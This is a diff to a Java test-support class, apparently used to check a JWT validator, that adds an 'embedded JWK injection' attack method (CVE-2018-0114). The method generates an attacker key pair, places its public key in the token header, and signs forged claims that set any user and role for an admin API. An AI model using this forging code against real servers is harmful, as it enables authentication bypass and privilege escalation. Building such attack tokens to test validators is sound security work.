@@ -176,6 +176,46 @@ public class AttackTokenGenerator {
     }
 
     /**
+     * Attack 7: Embedded JWK Key Injection (CVE-2018-0114, jwt_tool -X i).
+     * The attacker generates their own RSA key pair, embeds the public JWK inside the token's header,
+     * and signs the forged payload with their own private key.
+     * Vulnerable servers verify against the embedded key rather than a trusted key store.
+     */
+    public static String createEmbeddedJwkToken(String user, String role) {
+        try {
+            java.security.KeyPairGenerator kpg = java.security.KeyPairGenerator.getInstance("RSA");
+            kpg.initialize(2048);
+            java.security.KeyPair attackerPair = kpg.generateKeyPair();
+            java.security.interfaces.RSAPublicKey attackerPub = (java.security.interfaces.RSAPublicKey) attackerPair.getPublic();
+
+            com.nimbusds.jose.jwk.RSAKey attackerJwk = new com.nimbusds.jose.jwk.RSAKey.Builder(attackerPub)
+                .keyID("attacker-injected-key")
+                .build();
+
+            JWSHeader header = new JWSHeader.Builder(JWSAlgorithm.RS256)
+                .jwk(attackerJwk.toPublicJWK())
+                .type(new JOSEObjectType("at+jwt"))
+                .build();
+
+            Instant now = Instant.now();
+            JWTClaimsSet claims = new JWTClaimsSet.Builder()
+                .subject(user)
+                .issuer(KeyManager.ISSUER)
+                .audience("secured-admin-api")
+                .claim("role", role)
+                .issueTime(Date.from(now))
+                .expirationTime(Date.from(now.plusSeconds(300)))
+                .build();
+
+            SignedJWT signedJWT = new SignedJWT(header, claims);
+            signedJWT.sign(new RSASSASigner(attackerPair.getPrivate()));
+            return signedJWT.serialize();
+        } catch (Exception e) {
+            throw new RuntimeException("Error generating embedded jwk token", e);
+        }
+    }
+
+    /**
      * Legitimate, RFC 8725 & RFC 9068 fully secured access token.
      * - Asymmetric RS256 signature
      * - Explicit typ: "at+jwt"
